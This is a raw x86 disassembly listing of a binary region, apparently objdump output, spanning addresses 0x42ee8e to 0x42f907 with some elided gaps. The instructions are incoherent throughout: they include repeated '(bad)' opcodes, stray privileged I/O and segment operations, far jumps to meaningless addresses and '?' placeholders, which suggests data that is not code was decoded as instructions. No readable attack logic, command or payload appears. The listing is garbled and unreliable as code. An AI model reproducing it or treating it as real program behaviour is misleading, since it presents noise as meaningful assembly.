  42ee8e:	lods   al,BYTE PTR ds:[esi]
  42ee8f:	push   edx
  42ee90:	enter  0x63d3,0x37
  42ee94:	xchg   edx,eax
  42ee95:	add    BYTE PTR [ebp+0x4aa9ab81],bl
  42ee9b:	mov    esp,es
  42ee9d:	rcl    DWORD PTR [eax-0x2473d70f],1
  42eea3:	ss and esp,ebx
  42eea6:	int3   
  42eea7:	nop
  42eea8:	pop    eax
  42eea9:	jmp    0x42ee6c
  42eeab:	mov    cl,0x5f
  42eead:	push   cs
  42eeae:	jmp    0x3fbc2203
  42eeb3:	jl     0x42eebd
  42eeb5:	bnd ja 0x42eed7
  42eeb8:	mov    ch,0x93
  42eeba:	jae    0x42ee76
  42eebc:	xor    BYTE PTR [eax+0xc77982],ah
	...
  42ef32:	add    BYTE PTR [eax],al
  42ef34:	add    bh,dh
  42ef36:	jb     0x42eede
  42ef38:	(bad)  
  42ef39:	scas   al,BYTE PTR es:[edi]
  42ef3a:	(bad)  
  42ef3b:	(bad)  
  42ef3c:	cmp    DWORD PTR [edi],edi
  42ef3e:	int3   
  42ef3f:	repnz mov al,0xdb
  42ef42:	xor    DWORD PTR ds:[edx-0xafffe11],ebx
  42ef49:	add    BYTE PTR [eax],al
  42ef4b:	add    BYTE PTR [ebp+0x4396532a],al
  42ef51:	cmp    BYTE PTR ds:0x44de6c70,dh
  42ef57:	xlat   BYTE PTR ds:[ebx]
  42ef58:	sbb    DWORD PTR [esi],ebx
  42ef5a:	in     al,dx
  42ef5b:	inc    edi
  42ef5c:	cs in  eax,dx
  42ef5e:	xor    DWORD PTR [edx-0x4b5fb1b7],eax
  42ef64:	aad    0xfa
  42ef66:	mov    ch,0x7
  42ef68:	push   ss
  42ef69:	sbb    eax,0x117f91f0
  42ef6e:	sbb    al,0x3b
  42ef70:	out    dx,eax
  42ef71:	mov    esi,?
  42ef73:	sub    DWORD PTR [ecx],ecx
  42ef75:	popf   
  42ef76:	mov    bh,0xb2
  42ef78:	pop    DWORD PTR [ebp+ecx*4-0x61432ce1]
  42ef7f:	push   esp
  42ef80:	popf   
  42ef81:	fidiv  WORD PTR [ebx-0x56]
  42ef84:	stc    
  42ef85:	out    0x4f,eax
  42ef87:	mov    BYTE PTR [eax],dh
  42ef89:	xor    edx,DWORD PTR [eax+esi*1]
  42ef8c:	(bad)  
  42ef8d:	or     esi,DWORD PTR [ebx]
  42ef8f:	jecxz  0x42ef55
  42ef91:	neg    DWORD PTR [ebx+0x1]
  42ef94:	ds lahf 
  42ef96:	das    
  42ef97:	sbb    DWORD PTR [ecx+0x3e20c507],0xabed9a37
  42efa1:	stos   BYTE PTR es:[edi],al
  42efa2:	imul   edx,esi,0x6f40e049
  42efa8:	mov    BYTE PTR [esi-0x3ce85dc9],bh
  42efae:	leave  
  42efaf:	and    eax,0xc80de511
  42efb4:	mov    eax,ds:0x4487be52
  42efb9:	into   
  42efba:	push   ds
  42efbb:	rcr    DWORD PTR ds:0x1ab4de43,cl
  42efc1:	push   esi
  42efc2:	int3   
  42efc3:	rcr    bl,cl
  42efc5:	imul   BYTE PTR [eax+edi*4-0x5f]
  42efc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efca:	fsubr  DWORD PTR [eax+ecx*4]
  42efcd:	(bad)  
  42efce:	jmp    0x42f00b
  42efd0:	lock mov ah,0x7e
  42efd3:	leave  
  42efd4:	xor    eax,0x4ce786f9
  42efd9:	xor    ch,dl
  42efdb:	sub    al,0x8b
  42efdd:	pop    esp
  42efde:	imul   edx,edi,0x18aab909
  42efe4:	test   eax,0xe6a3dfc2
  42efe9:	xor    ah,dh
  42efeb:	pop    edi
  42efec:	xchg   esi,eax
  42efed:	mov    WORD PTR [ebx],fs
  42efef:	inc    ebp
  42eff0:	mov    edi,0x53f85480
  42eff5:	(bad)  
  42eff6:	jge    0x42ef9e
  42eff8:	jecxz  0x42f046
  42effa:	inc    esi
  42effb:	jle    0x42eff4
  42effd:	leave  
  42effe:	lods   eax,DWORD PTR ds:[si]
  42f000:	sahf   
  42f001:	inc    ecx
  42f002:	imul   esi,DWORD PTR [edx+ecx*2],0xad81c6f8
  42f009:	mov    eax,ds:0xae56783
  42f00e:	inc    esi
  42f00f:	mov    ebx,0x6cf1ce55
  42f014:	stc    
  42f015:	dec    ebp
  42f016:	push   ss
  42f017:	call   0x85a1:0xcdf37a6
  42f01e:	sub    edi,ecx
  42f020:	xlat   BYTE PTR ds:[ebx]
  42f021:	jno    0x42f042
  42f023:	xchg   ebx,eax
  42f024:	mov    al,0xc3
  42f026:	pop    ss
  42f027:	xor    eax,0x45d4ceaf
  42f02c:	(bad)  
  42f02d:	icebp  
  42f02e:	out    dx,eax
  42f02f:	cmp    al,0x2
  42f031:	nop
  42f032:	fucom  st(5)
  42f034:	lods   al,BYTE PTR ds:[esi]
  42f035:	ja     0x42f011
  42f037:	or     eax,0xfe93ce19
  42f03c:	mov    ds:0x34b4035e,al
	...
  42f0b1:	add    BYTE PTR [eax],al
  42f0b3:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42f0b9:	xlat   BYTE PTR ds:[ebx]
  42f0ba:	mov    ecx,0xd7e009ef
  42f0bf:	(bad)  
  42f0c1:	jnp    0x42f08e
  42f0c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0c4:	(bad)  
  42f0c5:	lock add DWORD PTR [eax],eax
  42f0c8:	cmc    
  42f0c9:	add    BYTE PTR [eax],al
  42f0cb:	add    BYTE PTR ds:0xa0d6edc4,ah
  42f0d1:	pop    edx
  42f0d2:	test   dh,dh
  42f0d4:	jno    0x42f0b8
  42f0d6:	sbb    eax,0xd645e1f6
  42f0db:	sub    dl,BYTE PTR [ecx-0x1249b3b8]
  42f0e1:	int    0xae
  42f0e3:	inc    edx
  42f0e4:	pop    ds
  42f0e5:	cld    
  42f0e6:	add    BYTE PTR ds:0xabb1b6d4,bh
  42f0ed:	xor    al,BYTE PTR [eax+0x45]
  42f0f0:	(bad)  
  42f0f1:	mov    cl,0x2b
  42f0f3:	inc    esp
  42f0f4:	push   ecx
  42f0f5:	mov    edx,0x216e2e0a
  42f0fa:	cmp    eax,0x3d44804d
  42f0ff:	test   DWORD PTR [esi+0x7cadfdc3],ebx
  42f105:	sbb    DWORD PTR [edi+0x352ad757],eax
  42f10b:	ja     0x42f0ad
  42f10d:	mov    ch,BYTE PTR [edx+ecx*2+0x1]
  42f111:	int3   
  42f112:	fcomp  st(7)
  42f114:	push   0x9b2b6329
  42f119:	jge    0x42f191
  42f11b:	cmp    al,0x88
  42f11d:	cmp    cl,cl
  42f11f:	es pushf 
  42f121:	xor    ah,BYTE PTR ds:0x3814adcf
  42f127:	push   ebp
  42f128:	mov    es,WORD PTR [ebx]
  42f12a:	ficom  WORD PTR [eax+0x659ca3af]
  42f130:	lods   al,BYTE PTR ds:[esi]
  42f131:	jnp    0x42f193
  42f133:	lods   al,BYTE PTR ds:[esi]
  42f134:	(bad)  
  42f135:	mov    ch,0x5a
  42f137:	daa    
  42f138:	inc    edi
  42f139:	inc    ebp
  42f13a:	mov    cl,0x77
  42f13c:	mov    esp,0x3177a087
  42f141:	icebp  
  42f142:	test   cl,dh
  42f144:	outs   dx,BYTE PTR ds:[esi]
  42f145:	dec    edx
  42f146:	pop    esp
  42f147:	aas    
  42f148:	jne    0x42f0e6
  42f14a:	scas   eax,DWORD PTR es:[edi]
  42f14b:	cmp    al,0x19
  42f14d:	sub    ah,bl
  42f14f:	loope  0x42f109
  42f151:	sahf   
  42f152:	mov    dh,0x10
  42f154:	cmp    eax,0x287fe4ea
  42f159:	push   ds
  42f15a:	push   ss
  42f15b:	jg     0x42f132
  42f15d:	pop    ebx
  42f15e:	cld    
  42f15f:	xchg   ebp,eax
  42f160:	cwde   
  42f161:	jne    0x42f1e2
  42f163:	lahf   
  42f164:	gs js  0x42f1d2
  42f167:	cmp    al,dh
  42f169:	push   ss
  42f16a:	lods   eax,DWORD PTR ds:[esi]
  42f16b:	xor    BYTE PTR [edx-0x41c749c5],ah
  42f171:	call   0x9aa8f52a
  42f176:	and    eax,0x5aa99361
  42f17b:	mov    bl,0x98
  42f17d:	lahf   
  42f17e:	mov    ds:0x69ed9df2,eax
  42f183:	dec    ebp
  42f184:	les    ebp,FWORD PTR [ebx-0x3cd9ec8b]
  42f18a:	jmp    0x8c13:0x8e1896f4
  42f191:	xchg   edi,eax
  42f192:	mov    cl,0xf5
  42f194:	cdq    
  42f195:	sbb    BYTE PTR [edx],bh
  42f197:	hlt    
  42f198:	test   al,0xc1
  42f19a:	dec    esp
  42f19b:	das    
  42f19c:	je     0x42f13e
  42f19e:	push   ebx
  42f19f:	repz fsubr QWORD PTR [ebp-0x1e]
  42f1a3:	pop    edx
  42f1a4:	ins    DWORD PTR es:[edi],dx
  42f1a5:	int    0xd7
  42f1a7:	(bad)  [ebx+0x29]
  42f1aa:	pushf  
  42f1ab:	jmp    0x9067:0xffa42858
  42f1b2:	sub    eax,0x98f0cbb6
  42f1b7:	aas    
  42f1b8:	mov    ds:0x42fb3fbb,al
  42f1bd:	xchg   esp,eax
  42f1be:	fld    QWORD PTR [eax-0x9]
	...
  42f231:	add    BYTE PTR [eax],al
  42f233:	add    BYTE PTR [ebp-0x655875c3],ch
  42f239:	mov    bh,0xad
  42f23b:	aas    
  42f23c:	jp     0x42f245
  42f23e:	int3   
  42f23f:	icebp  
  42f240:	or     BYTE PTR [ebp-0xe7b1194],bl
  42f246:	add    DWORD PTR [eax],eax
  42f248:	cmc    
  42f249:	add    BYTE PTR [eax],al
  42f24b:	add    BYTE PTR [edi],dh
  42f24d:	jmp    0x42f268
  42f24f:	pop    edx
  42f250:	hlt    
  42f251:	jecxz  0x42f2c0
  42f253:	ss enter 0xc243,0x5d
  42f258:	mov    al,0xbd
  42f25a:	adc    eax,0xbf742051
  42f25f:	pushf  
  42f260:	(bad)  
  42f261:	sbb    dh,al
  42f263:	rcl    DWORD PTR [edi-0x3f],0x6d
  42f267:	and    BYTE PTR [ecx+0x5b6dd388],ch
  42f26d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f26e:	test   eax,0xc0ba9d63
  42f273:	dec    edx
  42f274:	and    DWORD PTR [ecx],ebx
  42f276:	jmp    0x42f2bf
  42f278:	adc    al,0xc8
  42f27a:	cmp    eax,0xac6cfe46
  42f27f:	xor    BYTE PTR [ebp+0x33838b2d],0xf
  42f286:	mov    cl,bh
  42f288:	and    al,0x0
  42f28a:	jnp    0x42f216
  42f28c:	pop    ss
  42f28d:	add    ecx,DWORD PTR [edi+0xb155934]
  42f293:	dec    edi
  42f294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f295:	hlt    
  42f296:	imul   esi,DWORD PTR [ebx+0x25],0xffffffe3
  42f29a:	ins    DWORD PTR es:[edi],dx
  42f29b:	mov    cl,0x13
  42f29d:	lock mov ds:0x8e853451,eax
  42f2a3:	fisttp QWORD PTR [ecx+0x417e1b6d]
  42f2a9:	inc    ecx
  42f2aa:	cmp    DWORD PTR [ecx+0x4b],ecx
  42f2ad:	push   ecx
  42f2ae:	mov    esi,0x584bbe8d
  42f2b3:	iret   
  42f2b4:	add    esi,DWORD PTR [ebx+0x6b]
  42f2b7:	shl    DWORD PTR [ebx+0x23],1
  42f2ba:	gs retf 
  42f2bc:	push   esp
  42f2bd:	push   ss
  42f2be:	add    ebp,DWORD PTR ds:0x1ec5955e
  42f2c4:	int3   
  42f2c5:	test   eax,0x497ab1bf
  42f2ca:	fisttp QWORD PTR [edi+0x514d40a7]
  42f2d0:	je     0x42f330
  42f2d2:	in     eax,0x3d
  42f2d4:	stc    
  42f2d5:	xchg   ebx,eax
  42f2d6:	ret    
  42f2d7:	int3   
  42f2d8:	scas   al,BYTE PTR es:[edi]
  42f2d9:	clc    
  42f2da:	pop    esp
  42f2db:	or     BYTE PTR [ebp+0x4bc8c424],dl
  42f2e1:	icebp  
  42f2e2:	ss push cs
  42f2e4:	loop   0x42f327
  42f2e6:	test   al,0xce
  42f2e8:	xchg   esi,eax
  42f2e9:	push   edx
  42f2ea:	test   eax,0x4e106109
  42f2ef:	aas    
  42f2f0:	inc    edx
  42f2f1:	test   eax,0x1db8fc63
  42f2f6:	call   0x1d0eae3d
  42f2fb:	retf   
  42f2fc:	aaa    
  42f2fd:	inc    edi
  42f2fe:	lods   eax,DWORD PTR ds:[esi]
  42f2ff:	shl    ah,0x8f
  42f302:	ficomp WORD PTR ds:0x451e8eff
  42f308:	dec    ebx
  42f309:	mov    bh,0x1d
  42f30b:	jmp    0x4771:0x9ff3fd5f
  42f312:	cmc    
  42f313:	lods   al,BYTE PTR ds:[esi]
  42f314:	cmp    al,0x1
  42f316:	xchg   ebx,eax
  42f317:	test   eax,0x51ba704f
  42f31c:	data16 je 0x42f2ed
  42f31f:	bound  ecx,QWORD PTR [esi-0x2f]
  42f322:	mov    es,WORD PTR [eax+edi*1]
  42f325:	pushf  
  42f326:	xchg   edi,eax
  42f327:	iret   
  42f328:	mov    al,0x87
  42f32a:	jge    0x42f398
  42f32c:	mov    dh,0x4a
  42f32e:	test   al,0x95
  42f330:	repz adc esp,DWORD PTR [ebp+edx*1+0x743455f]
  42f338:	pop    es
  42f339:	in     al,0xa6
  42f33b:	in     eax,dx
  42f33c:	xor    bh,bh
  42f33e:	jbe    0x42f2e6
  42f340:	add    BYTE PTR es:[eax],al
	...
  42f3b3:	add    dl,ah
  42f3b5:	mov    ebp,0xe7dfc7dc
  42f3ba:	sti    
  42f3bb:	mov    ebp,0xca33a8a7
  42f3c0:	mov    ch,0x62
  42f3c2:	sub    DWORD PTR [ecx+edi*2],0xfffffff2
  42f3c6:	add    DWORD PTR [eax],eax
  42f3c8:	cmc    
  42f3c9:	add    BYTE PTR [eax],al
  42f3cb:	add    BYTE PTR [eax-0x31774158],bh
  42f3d1:	cmp    ecx,eax
  42f3d3:	int3   
  42f3d4:	xor    edi,DWORD PTR [ebp+0x7a]
  42f3d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f3d8:	imul   ecx,esi,0xbe3a3c3d
  42f3de:	jmp    0x42f3e7
  42f3e0:	stos   DWORD PTR es:[edi],eax
  42f3e1:	outs   dx,BYTE PTR ds:[esi]
  42f3e2:	mov    eax,0xd3cef94f
  42f3e7:	inc    edx
  42f3e8:	xchg   esp,ecx
  42f3ea:	call   0x24ec65df
  42f3ef:	dec    ecx
  42f3f0:	loope  0x42f405
  42f3f2:	rol    BYTE PTR [ebx-0xf],1
  42f3f5:	jmp    0x5fd9:0x69582820
  42f3fc:	xor    ecx,DWORD PTR [edi+0x76f6c134]
  42f402:	push   ds
  42f403:	fist   WORD PTR [edx]
  42f405:	lock clc 
  42f407:	mov    ebp,0x63dcb7a1
  42f40c:	mov    edi,0xba0282f5
  42f411:	rol    DWORD PTR [edx-0x76],1
  42f414:	clc    
  42f415:	ja     0x42f403
  42f417:	adc    ah,BYTE PTR [ebx]
  42f419:	call   0xa3b25a03
  42f41e:	(bad)  [edx]
  42f420:	pop    es
  42f421:	test   DWORD PTR [ebx-0x61],ecx
  42f424:	fwait
  42f425:	mov    bl,0x2b
  42f427:	mov    ecx,0xd1446f6f
  42f42c:	dec    edi
  42f42d:	out    0xe4,eax
  42f42f:	mov    ecx,0xc021f51
  42f434:	or     cl,ah
  42f436:	out    0x7,eax
  42f438:	idiv   BYTE PTR [esi-0x500908ef]
  42f43e:	in     al,0xa9
  42f440:	(bad)  
  42f441:	or     al,0x2c
  42f443:	sahf   
  42f444:	or     DWORD PTR [ecx],edi
  42f446:	outs   dx,DWORD PTR ds:[esi]
  42f447:	mov    ecx,cs
  42f449:	and    DWORD PTR [ecx],eax
  42f44b:	lock ret 
  42f44d:	add    eax,0x9d654587
  42f452:	jbe    0x42f4a1
  42f454:	shl    bl,cl
  42f456:	dec    edi
  42f457:	pop    ebp
  42f458:	push   0xffffffe4
  42f45a:	mov    ds:0x5f25687b,al
  42f45f:	mov    ah,BYTE PTR [edx+0x39]
  42f462:	jl     0x42f492
  42f464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f465:	addr16 jnp 0x42f3f0
  42f468:	cmp    BYTE PTR [esi-0x66cb3f7f],bh
  42f46e:	out    0x5,eax
  42f470:	gs push esi
  42f472:	mov    ds:0xeca6029a,al
  42f477:	fisttp DWORD PTR cs:[esi-0x4c469197]
  42f47e:	aas    
  42f47f:	xor    ebp,esi
  42f481:	fst    DWORD PTR [ebx-0x1d]
  42f484:	mov    BYTE PTR [ecx+0x2e432394],al
  42f48a:	mov    al,ds:0x5ec56124
  42f48f:	pop    ecx
  42f490:	clc    
  42f491:	jl     0x42f451
  42f493:	push   esi
  42f494:	mov    ch,0xf4
  42f496:	push   edi
  42f497:	adc    ebx,ebp
  42f499:	inc    edi
  42f49a:	and    eax,0xd3ad535d
  42f49f:	mov    ds,edi
  42f4a1:	shr    ebx,0x55
  42f4a4:	sbb    eax,0x9cf2b3d0
  42f4a9:	dec    edi
  42f4aa:	and    DWORD PTR [edi-0x6e1e08c3],ebp
  42f4b0:	fdivr  DWORD PTR [edx-0x1e]
  42f4b3:	jp     0x42f456
  42f4b5:	cmp    esp,DWORD PTR [edi+0x48]
  42f4b8:	inc    edx
  42f4b9:	inc    edx
  42f4ba:	push   ebx
  42f4bb:	ret    
  42f4bc:	enter  0xfc3a,0x21
  42f4c0:	pop    ss
	...
  42f531:	add    BYTE PTR [eax],al
  42f533:	add    BYTE PTR [ebp+0x38],dl
  42f536:	into   
  42f537:	adc    bh,ch
  42f539:	neg    bh
  42f53b:	jge    0x42f546
  42f53d:	push   cs
  42f53e:	xchg   BYTE PTR [edi+0xa],bh
  42f541:	lds    eax,FWORD PTR [ebp+0xc]
  42f544:	outs   dx,BYTE PTR ds:[esi]
  42f545:	repz add DWORD PTR [eax],eax
  42f548:	cmc    
  42f549:	add    BYTE PTR [eax],al
  42f54b:	add    al,cl
  42f54d:	lock imul ecx,esi,0x1e6ecc27
  42f554:	push   esi
  42f555:	cmp    cl,ah
  42f557:	das    
  42f558:	(bad)  
  42f559:	mov    bl,0xbd
  42f55b:	pop    ss
  42f55c:	fsub   DWORD PTR [edi-0x517dac30]
  42f562:	lock sahf 
  42f564:	sub    ecx,edx
  42f566:	out    dx,al
  42f567:	xor    ah,ch
  42f569:	or     eax,DWORD PTR [edx-0x1e]
  42f56c:	mov    edi,0xc2f05cd3
  42f571:	push   ecx
  42f572:	dec    ebx
  42f573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f574:	std    
  42f575:	adc    DWORD PTR [edx-0x53],ebp
  42f578:	or     DWORD PTR ds:0xd0ab1d5e,esp
  42f57e:	mov    ecx,0xd81b7ed3
  42f583:	or     BYTE PTR [ebp-0x62],ah
  42f586:	add    BYTE PTR [esi+0x57],bh
  42f589:	loopne 0x42f569
  42f58b:	jbe    0x42f5d1
  42f58d:	sti    
  42f58e:	xlat   BYTE PTR ds:[ebx]
  42f58f:	call   0x1145f4dc
  42f594:	adc    DWORD PTR [ebx+0x526893d1],edi
  42f59a:	mov    ds,WORD PTR [edx-0x2d95d06f]
  42f5a0:	sub    esi,edi
  42f5a2:	jmp    0xba1de39d
  42f5a7:	mov    edx,0x75cddcfc
  42f5ac:	nop
  42f5ad:	int3   
  42f5ae:	aas    
  42f5af:	xchg   edi,eax
  42f5b0:	jo     0x42f5f8
  42f5b2:	xor    ebp,DWORD PTR [ecx+0x6d]
  42f5b5:	xchg   edx,eax
  42f5b6:	iret   
  42f5b7:	(bad)  
  42f5b8:	test   BYTE PTR [ebp-0x71],0x75
  42f5bc:	aas    
  42f5bd:	cmp    BYTE PTR [esi-0x50743a29],ch
  42f5c3:	sub    BYTE PTR [edx+0x47b5a1f1],ah
  42f5c9:	cmp    ebx,eax
  42f5cb:	dec    ecx
  42f5cc:	iret   
  42f5cd:	mov    ecx,0x753aee43
  42f5d2:	js     0x42f580
  42f5d4:	cmp    ch,ah
  42f5d6:	scas   al,BYTE PTR es:[edi]
  42f5d7:	fnstsw WORD PTR [edi]
  42f5d9:	pop    es
  42f5da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f5db:	dec    eax
  42f5dc:	aam    0x73
  42f5de:	mov    WORD PTR [edx+0x11],ss
  42f5e1:	or     al,0x3d
  42f5e3:	fnstsw WORD PTR [ebx+0x54]
  42f5e6:	rcl    BYTE PTR [eax*1-0x63144612],cl
  42f5ed:	xor    ecx,DWORD PTR [eax]
  42f5ef:	pop    ebp
  42f5f0:	mov    ds:0x680c6258,al
  42f5f5:	ficom  DWORD PTR ds:0x3886576b
  42f5fb:	std    
  42f5fc:	iret   
  42f5fd:	loop   0x42f601
  42f5ff:	mov    al,0x69
  42f601:	mov    BYTE PTR [edx+0x18],0xe4
  42f605:	inc    edx
  42f606:	or     eax,0xf59e4a34
  42f60b:	xor    esi,esi
  42f60d:	(bad)  
  42f60e:	mov    edi,0xbf4db26
  42f613:	scas   eax,DWORD PTR es:[edi]
  42f614:	ins    BYTE PTR es:[edi],dx
  42f615:	leave  
  42f616:	mov    eax,0xaf9544ed
  42f61b:	out    dx,al
  42f61c:	repz iret 
  42f61e:	inc    esi
  42f61f:	add    al,0xca
  42f621:	add    al,0x7c
  42f623:	lods   al,BYTE PTR ds:[esi]
  42f624:	mov    WORD PTR [edi+0x733f5645],?
  42f62a:	xchg   ecx,eax
  42f62b:	mov    al,0xc4
  42f62d:	loope  0x42f626
  42f62f:	lahf   
  42f630:	cmp    eax,0x2ebb0cf
  42f635:	jns    0x42f5c9
  42f637:	sahf   
  42f638:	aam    0x14
  42f63a:	jecxz  0x42f60a
  42f63c:	loopne 0x42f650
  42f63e:	inc    edi
  42f63f:	repnz repz add BYTE PTR [eax],al
	...
  42f6b3:	add    BYTE PTR [edx+0x39],bl
  42f6b6:	dec    esi
  42f6b7:	sub    eax,0x7f7b7f6f
  42f6bc:	or     DWORD PTR [edi+0x6c1a32e3],esi
  42f6c2:	jo     0x42f665
  42f6c4:	arpl   sp,si
  42f6c6:	add    DWORD PTR [eax],eax
  42f6c8:	cmc    
  42f6c9:	add    BYTE PTR [eax],al
  42f6cb:	add    BYTE PTR [edi+0x49bd4650],bl
  42f6d1:	adc    DWORD PTR fs:[edi-0x5025d3e5],ecx
  42f6d8:	dec    ebx
  42f6d9:	cmc    
  42f6da:	sub    dh,BYTE PTR [edi+0x41]
  42f6dd:	scas   eax,DWORD PTR es:[edi]
  42f6de:	out    dx,eax
  42f6df:	pop    edx
  42f6e0:	jnp    0x42f6dc
  42f6e2:	pushf  
  42f6e3:	sahf   
  42f6e4:	popf   
  42f6e5:	adc    edi,DWORD PTR [edx+0x3b]
  42f6e8:	jmp    0x42f6c1
  42f6ea:	and    eax,0xc9e63c92
  42f6ef:	into   
  42f6f0:	or     DWORD PTR [esi-0x61],esi
  42f6f3:	fisub  DWORD PTR [edx+0x50]
  42f6f6:	or     eax,0x2bdd5ec1
  42f6fb:	sbb    bh,0xd
  42f6fe:	dec    esi
  42f6ff:	mov    esp,0x9906b03a
  42f704:	sbb    DWORD PTR [ebp-0x7aeb971a],edx
  42f70a:	cli    
  42f70b:	add    ebp,DWORD PTR [ecx-0x4427b22b]
  42f711:	mov    dl,0x91
  42f713:	and    al,0x3b
  42f715:	mov    al,0x58
  42f717:	add    al,0xb
  42f719:	jne    0x42f69e
  42f71b:	iret   
  42f71c:	mov    bh,0xe9
  42f71e:	aad    0x88
  42f720:	fninit 
  42f722:	aam    0x76
  42f724:	(bad)  
  42f725:	pop    esp
  42f726:	inc    esi
  42f727:	xor    eax,0x88fa49c9
  42f72c:	mov    WORD PTR [ecx+0x73],fs
  42f72f:	fnstenv [ecx+0x5c5b81f5]
  42f735:	sub    DWORD PTR [ebp-0x16cc776a],esi
  42f73b:	mov    ebp,0x886b12a2
  42f740:	ds xor al,0x12
  42f743:	fidivr DWORD PTR [ecx]
  42f745:	ja     0x42f725
  42f747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f748:	xor    bl,BYTE PTR [ebp+eiz*2+0x44ffe703]
  42f74f:	fstp   QWORD PTR [ebx]
  42f751:	xor    dh,bh
  42f753:	popa   
  42f754:	inc    ebp
  42f755:	xor    DWORD PTR [ecx+0x1a],esi
  42f758:	outs   dx,DWORD PTR ds:[esi]
  42f759:	fadd   QWORD PTR [edx-0x2a16f653]
  42f75f:	dec    ebp
  42f760:	adc    ch,BYTE PTR [esi-0x7f998422]
  42f766:	shl    ebx,cl
  42f768:	cld    
  42f769:	(bad)  
  42f76a:	xor    ebp,esp
  42f76c:	addr16 out 0x87,eax
  42f76f:	inc    edx
  42f770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f771:	pop    eax
  42f772:	dec    ebp
  42f773:	aam    0x98
  42f775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f776:	push   eax
  42f777:	jns    0x42f70b
  42f779:	imul   edi,DWORD PTR [edi-0xfb789f3],0xffffffac
  42f780:	dec    ebp
  42f781:	jne    0x42f7f0
  42f783:	std    
  42f784:	fist   DWORD PTR [ecx]
  42f786:	fidivr WORD PTR [ebx-0xd68abdb]
  42f78c:	add    BYTE PTR [eax+0x5f],al
  42f78f:	or     ah,BYTE PTR ds:0x20dd324
  42f795:	jmp    0x6f20256
  42f79a:	jbe    0x42f7b5
  42f79c:	push   ds
  42f79d:	leave  
  42f79e:	inc    edi
  42f79f:	fmul   st,st(1)
  42f7a1:	or     esi,DWORD PTR [ebp-0x5d1e66b1]
  42f7a7:	jnp    0x42f7ab
  42f7a9:	cmp    BYTE PTR [ebx-0x69],dl
  42f7ac:	cmp    dl,al
  42f7ae:	xchg   esp,eax
  42f7af:	gs stos BYTE PTR es:[edi],al
  42f7b1:	test   ecx,0xd30a9128
  42f7b7:	mov    bh,0x65
  42f7b9:	jo     0x42f766
  42f7bb:	xor    DWORD PTR [ecx],ebp
  42f7bd:	ret    0xbfc1
  42f7c0:	lods   al,BYTE PTR ds:[esi]
	...
  42f831:	add    BYTE PTR [eax],al
  42f833:	add    bl,al
  42f835:	ja     0x42f897
  42f837:	and    al,0xf4
  42f839:	aaa    
  42f83a:	(bad)  
  42f83b:	neg    DWORD PTR [edi+0x3f50c88f]
  42f841:	adc    eax,0xf558985b
  42f846:	add    DWORD PTR [eax],eax
  42f848:	cmc    
  42f849:	add    BYTE PTR [eax],al
  42f84b:	add    BYTE PTR [ebp+0x14],bl
  42f84e:	fwait
  42f84f:	bound  esp,QWORD PTR [ebp-0x3a]
  42f852:	dec    esi
  42f853:	rol    DWORD PTR [ebp+eiz*4+0x285a0314],0x20
  42f85b:	retf   
  42f85c:	enter  0x4e6d,0x18
  42f860:	jl     0x42f8a8
  42f862:	test   eax,0xe8ed51cd
  42f867:	cwde   
  42f868:	std    
  42f869:	mov    al,ds:0x6f4cd962
  42f86e:	xchg   edi,eax
  42f86f:	push   es
  42f870:	or     ch,BYTE PTR [ecx+0x645d4fd4]
  42f876:	sub    dh,ah
  42f878:	push   ss
  42f879:	mov    eax,0x1b766131
  42f87e:	mov    dl,0x2f
  42f880:	sahf   
  42f881:	inc    esp
  42f882:	stc    
  42f883:	add    bl,BYTE PTR [ebx]
  42f885:	loopne 0x42f87b
  42f887:	test   DWORD PTR [ebx-0x1a],0xbdbdb277
  42f88e:	dec    esp
  42f88f:	mov    ah,0x45
  42f891:	sahf   
  42f892:	dec    edx
  42f893:	pop    es
  42f894:	sub    eax,ebp
  42f896:	pop    ebp
  42f897:	cs cdq 
  42f899:	mov    ds:0x94d70291,al
  42f89e:	pop    ebx
  42f89f:	call   0x13e8:0xce57c68b
  42f8a6:	retf   0x6f28
  42f8a9:	stos   DWORD PTR es:[edi],eax
  42f8aa:	adc    ebp,DWORD PTR ds:[edx]
  42f8ad:	(bad)  
  42f8ae:	xchg   esi,eax
  42f8af:	(bad)  
  42f8b0:	or     BYTE PTR [ebx+0x40c6ae9f],dl
  42f8b6:	inc    BYTE PTR [edx]
  42f8b8:	retf   
  42f8b9:	lods   al,BYTE PTR ds:[esi]
  42f8ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8bb:	shl    DWORD PTR [ebp+eiz*1+0x7],cl
  42f8bf:	leave  
  42f8c0:	arpl   WORD PTR [edi-0x2d],ax
  42f8c3:	icebp  
  42f8c4:	aaa    
  42f8c5:	jle    0x42f8e9
  42f8c7:	shl    DWORD PTR [edi+0x6d],1
  42f8ca:	sar    DWORD PTR [edi+eiz*2-0x6036986e],1
  42f8d1:	mov    bh,0xc5
  42f8d3:	daa    
  42f8d4:	cmc    
  42f8d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f8d6:	shr    ebp,cl
  42f8d8:	mov    cl,0x74
  42f8da:	je     0x42f888
  42f8dc:	fistp  DWORD PTR [ecx+0x1ff902ee]
  42f8e2:	xor    BYTE PTR [edi],dl
  42f8e4:	out    dx,al
  42f8e5:	cwd    
  42f8e7:	fisttp WORD PTR [edx+0x4d]
  42f8ea:	or     cl,BYTE PTR [ecx-0x6ae930fd]
  42f8f0:	jl     0x42f8a7
  42f8f2:	(bad)  
  42f8f3:	sti    
  42f8f4:	pop    esi
  42f8f5:	jne    0x42f961
  42f8f7:	repz hlt 
  42f8f9:	xchg   ecx,eax
  42f8fa:	ret    0x6dd5
  42f8fd:	pusha  
  42f8fe:	shl    BYTE PTR [edi-0x40],1
  42f901:	test   ch,ch
  42f903:	scas   al,BYTE PTR es:[edi]
  42f904:	fst    QWORD PTR [ebp+0x45]
  42f907:	mov    BYTE PTR [eax+0x5bcfa36d],ah
